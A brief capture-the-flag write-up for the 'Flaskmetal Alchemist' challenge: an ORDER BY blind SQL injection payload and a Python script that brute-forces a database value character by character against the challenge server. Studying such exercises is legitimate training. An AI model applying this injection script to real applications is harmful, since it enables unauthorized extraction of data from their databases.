## Flaskmetal Alchemist:

Edward has decided to get into web development, and he built this awesome application that lets you search for any metal you want. Alphonse has some reservations though, so he wants you to check it out and make sure it's legit.

Attachment: [fma.zip](files/Flaskmetal-Alchemist-fma.zip)

-----

looking at app.py we can say that it maybe valnurable to orderby blind sqli

payload= 
```
(CASE WHEN (SELECT (SUBTR(flag, 1,1)) from flag) = 'f' THEN name ELSE atomic_number END)--
```
it will sort by name if true and number if false
here is python script to brute force flag:
```python
 import string
    from bs4 import BeautifulSoup
    import requests
    
    url = "http://challenge.nahamcon.com:31631/"
    
    data = {'search': '',
            'order': "(CASE WHEN (SELECT (SUBSTR(flag, 1, 1)) from flag ) = 'f' THEN name ELSE atomic_number END)--"}
    x = requests.post(url, data=data)
    # x1 = BeautifulSoup(x.text, features='lxml').td.contents[0]
    # print(x1)
    s = 'flag{' + string.ascii_lowercase + '_' + '}'
    # print(s, type(s))
    flag = ''
    for i in range(1, 100):
        h1 = len(flag)
        for k in s:
            if len(flag) > h1:
                continue
            data = {'search': '',
                    'order': f"(CASE WHEN (SELECT (SUBSTR(flag, {i}, 1)) from flag ) = '{k}' THEN name ELSE atomic_number END)--"}
            # print(f'checking {data.values()}')
            x = requests.post(url, data=data)
            if BeautifulSoup(x.text, features='lxml').td.contents[0] == '89':
                flag += k
        print(flag)
        if flag[-1] == '}':
            break
    
```

```
flag{order_by_blind}
```

